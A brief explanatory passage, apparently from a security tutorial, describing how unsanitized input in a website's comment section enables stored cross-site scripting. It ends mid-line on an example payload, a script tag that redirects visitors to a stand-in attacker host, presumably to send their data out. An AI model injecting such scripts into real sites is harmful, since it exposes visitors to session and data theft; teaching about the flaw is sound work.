Cross-Site Scripting (XSS):
Starting from the comment section on our website where users can leave comments. 
They enter their comment in a form, and that comment is then displayed on the website. 
If user input is not sanitized, a user could enter something like this:

<script>document.location='https://attacker.com/
